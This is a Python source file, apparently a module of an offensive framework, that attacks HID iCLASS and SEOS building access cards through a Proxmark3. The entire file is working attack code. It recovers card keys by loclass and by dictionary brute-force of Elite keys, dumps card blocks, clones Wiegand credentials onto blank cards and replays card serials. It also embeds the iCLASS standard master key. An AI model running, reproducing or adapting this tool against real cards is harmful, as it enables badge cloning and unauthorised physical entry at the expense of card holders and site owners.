#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""HID iCLASS and SEOS credential attack module.

Implements key recovery and credential extraction for HID iCLASS (legacy
and SE) and SEOS access control cards. Supports loclass offline attack for
iCLASS standard keys, Elite key diversification brute-force, and SEOS
credential dumping via Proxmark3.

References:
  https://github.com/RfidResearchGroup/proxmark3
  https://iceman.gitbook.io/proxmark3-iclass-cloning/
  https://github.com/holiman/loclass
  https://www.cs.ru.nl/~flavlou/publications/CARDIS2011.pdf

MITRE ATT&CK: T1552.004 (Unsecured Credentials: Private Keys)
CWE: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

ICLASS_STANDARD_KEY = bytes.fromhex("AE A6 84 A6 DA B2 32 78")
ICLASS_CREDIT_KEY_DEFAULT = bytes.fromhex("76 65 54 43 32 21 10 00")


class CardVariant(Enum):
    ICLASS_STANDARD = auto()
    ICLASS_SE = auto()
    ICLASS_SEOS = auto()
    UNKNOWN = auto()


class AttackType(Enum):
    LOCLASS = auto()
    ELITE_BRUTE = auto()
    DUMP = auto()
    CLONE = auto()
    REPLAY = auto()


@dataclass
class IClassCredential:
    uid: str = ""
    variant: CardVariant = CardVariant.UNKNOWN
    wiegand_raw: bytes = b""
    facility_code: int = 0
    card_number: int = 0
    block_data: dict[int, bytes] = field(default_factory=dict)
    key_debit: bytes = b""
    key_credit: bytes = b""
    diversified: bool = False


class IClassSeosAttack(Exploit):
    """HID iCLASS/SEOS credential attack module."""

    __info__: dict[str, Any] = {
        "name": "HID iCLASS/SEOS Attack",
        "description": (
            "Key recovery and credential extraction for HID iCLASS and SEOS "
            "access cards. Loclass offline attack, Elite key diversification "
            "brute-force, and credential cloning via Proxmark3."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/RfidResearchGroup/proxmark3",
            "https://github.com/holiman/loclass",
            "https://www.cs.ru.nl/~flavlou/publications/CARDIS2011.pdf",
        ),
        "devices": ("HID iCLASS", "HID iCLASS SE", "HID SEOS"),
        "severity": "critical",
        "cvss": "9.1",
        "cve": "generic",
        "mitre": ["T1552.004"],
    }

    attack = OptString("dump", "Attack: dump, loclass, elite_brute, clone, replay")
    pm3_port = OptString("/dev/ttyACM0", "Proxmark3 serial port")
    target_uid = OptString("", "Target card UID (hex, empty=auto)")
    clone_data = OptString("", "Raw Wiegand data hex for clone operation")
    elite_wordlist = OptString("", "Wordlist for Elite key brute-force")
    timeout_sec = OptInteger(120, "Operation timeout")
    dry_run = OptBool(False, "Print commands without executing")

    def __init__(self) -> None:
        super().__init__()
        self._credential: IClassCredential | None = None

    def check(self) -> str:
        """Verify Proxmark3 with iCLASS support."""
        if not shutil.which("proxmark3"):
            return "Proxmark3 not found. Install RRG fork: github.com/RfidResearchGroup/proxmark3"

        output = self._pm3("hw version")
        if "RRG" in output or "Iceman" in output:
            return "Proxmark3 RRG/Iceman firmware detected (iCLASS supported)"
        if output:
            return "Proxmark3 detected (verify RRG firmware for full iCLASS support)"
        return "Could not connect to Proxmark3"

    def _pm3(self, cmd: str) -> str:
        """Execute Proxmark3 command."""
        if self.dry_run.value:
            print_info(f"[dry-run] pm3 --> {cmd}")
            return "[dry-run]"
        try:
            result = subprocess.run(
                ["proxmark3", str(self.pm3_port.value), "-c", cmd],
                capture_output=True, text=True,
                timeout=int(self.timeout_sec.value),
            )
            return result.stdout + result.stderr
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            logger.error("pm3 failed: %s", exc)
            return ""

    def _detect_card(self) -> IClassCredential | None:
        """Detect and identify iCLASS/SEOS card."""
        print_status("[*] Scanning for iCLASS/SEOS card...")
        output = self._pm3("hf iclass info")

        cred = IClassCredential()
        for line in output.splitlines():
            stripped = line.strip()
            if "CSN" in stripped or "UID" in stripped:
                parts = stripped.split(":")
                if len(parts) > 1:
                    cred.uid = parts[-1].strip().replace(" ", "")
            if "iCLASS SE" in stripped:
                cred.variant = CardVariant.ICLASS_SE
            elif "SEOS" in stripped:
                cred.variant = CardVariant.ICLASS_SEOS
            elif "iCLASS" in stripped:
                cred.variant = CardVariant.ICLASS_STANDARD

        if cred.uid:
            print_success(f"[+] Detected: {cred.variant.name} UID={cred.uid}")
            return cred

        print_warning("[!] No iCLASS/SEOS card detected")
        return None

    def _dump_card(self, cred: IClassCredential) -> bool:
        """Dump iCLASS card blocks using default or recovered keys."""
        print_status("[*] Dumping card blocks...")

        output = self._pm3("hf iclass dump --ki 0")
        if "dumped" in output.lower() or "saved" in output.lower():
            print_success("[+] Card dump saved")

            for line in output.splitlines():
                stripped = line.strip()
                if "block" in stripped.lower() and ":" in stripped:
                    parts = stripped.split(":")
                    try:
                        blk_num = int(parts[0].split()[-1])
                        blk_data = bytes.fromhex(parts[1].strip().replace(" ", "")[:16])
                        cred.block_data[blk_num] = blk_data
                    except (ValueError, IndexError):
                        continue

            if 6 in cred.block_data or 7 in cred.block_data:
                wiegand_block = cred.block_data.get(7, cred.block_data.get(6, b""))
                cred.wiegand_raw = wiegand_block
                self._parse_wiegand(cred, wiegand_block)

            return True

        print_warning("[!] Dump failed with default key, try loclass attack")
        return False

    def _parse_wiegand(self, cred: IClassCredential, data: bytes) -> None:
        """Parse Wiegand credential from block data."""
        if len(data) < 4:
            return
        raw_int = int.from_bytes(data[:4], "big")
        cred.facility_code = (raw_int >> 17) & 0xFF
        cred.card_number = (raw_int >> 1) & 0xFFFF
        print_info(f"    Wiegand: FC={cred.facility_code} CN={cred.card_number}")

    def _loclass_attack(self, cred: IClassCredential) -> bool:
        """Run loclass offline key recovery."""
        print_status("[*] Loclass attack: collecting MAC traces from card...")
        print_info("[*] Step 1: Collect authentication traces")

        collect_output = self._pm3("hf iclass loclass")
        if "saved" in collect_output.lower() or "mac" in collect_output.lower():
            print_success("[+] MAC traces collected")
        else:
            print_warning("[!] Could not collect MAC traces")

        print_info("[*] Step 2: Running loclass key recovery (offline)...")
        recover_output = self._pm3("hf iclass loclass --recover")

        for line in recover_output.splitlines():
            stripped = line.strip()
            if "key" in stripped.lower():
                parts = stripped.split()
                for part in parts:
                    clean = part.replace(":", "").replace(" ", "")
                    if len(clean) == 16:
                        try:
                            cred.key_debit = bytes.fromhex(clean)
                            cred.diversified = True
                            print_success(f"[+] Recovered debit key: {clean.upper()}")
                            return True
                        except ValueError:
                            continue

        print_warning("[!] Loclass recovery did not produce a key")
        return False

    def _elite_bruteforce(self, cred: IClassCredential) -> bool:
        """Brute-force Elite key using dictionary."""
        wordlist = str(self.elite_wordlist.value)
        if not wordlist:
            print_error("[-] Elite brute-force requires a wordlist (set elite_wordlist)")
            return False

        print_status(f"[*] Elite key brute-force using {wordlist}")
        output = self._pm3(f"hf iclass chk --elite --f {wordlist}")

        if "found" in output.lower():
            for line in output.splitlines():
                if "found" in line.lower() and "key" in line.lower():
                    parts = line.split()
                    for part in parts:
                        clean = part.replace(":", "")
                        if len(clean) == 16:
                            try:
                                cred.key_debit = bytes.fromhex(clean)
                                print_success(f"[+] Elite key found: {clean.upper()}")
                                return True
                            except ValueError:
                                continue
        print_warning("[!] No Elite key found in wordlist")
        return False

    def _clone_card(self, cred: IClassCredential) -> bool:
        """Clone credential to a writable iCLASS card."""
        clone_hex = str(self.clone_data.value) or cred.wiegand_raw.hex()
        if not clone_hex:
            print_error("[-] No credential data to clone (set clone_data or dump first)")
            return False

        print_status(f"[*] Cloning Wiegand data: {clone_hex.upper()}")
        output = self._pm3(f"hf iclass wrbl --blk 7 -d {clone_hex} --ki 0")

        if "written" in output.lower() or self.dry_run.value:
            print_success("[+] Clone successful: verify with card reader")
            return True

        print_error("[-] Clone failed")
        return False

    def run(self) -> None:
        """Execute iCLASS/SEOS attack."""
        print_status("[*] HID iCLASS/SEOS Attack v1.0.0")

        cred = self._detect_card()
        if not cred:
            return
        self._credential = cred

        attack_str = str(self.attack.value).lower()

        if attack_str == "dump":
            self._dump_card(cred)

        elif attack_str == "loclass":
            if self._loclass_attack(cred):
                print_info("[*] Key recovered; attempting dump with new key...")
                self._dump_card(cred)

        elif attack_str == "elite_brute":
            if self._elite_bruteforce(cred):
                self._dump_card(cred)

        elif attack_str == "clone":
            self._clone_card(cred)

        elif attack_str == "replay":
            print_status("[*] Replay: reading and re-emitting card UID")
            output = self._pm3(f"hf iclass sim --csn {cred.uid}")
            print_info(f"[*] Simulating CSN: {cred.uid}")

        else:
            print_error(f"[-] Unknown attack: {attack_str}")
            return

        print_status(f"\n[*] Card: {cred.variant.name} UID={cred.uid}")
        if cred.facility_code or cred.card_number:
            print_info(f"    FC={cred.facility_code} CN={cred.card_number}")
        if cred.key_debit:
            print_info(f"    Debit key: {cred.key_debit.hex().upper()}")
        print_info(f"    Blocks read: {len(cred.block_data)}")
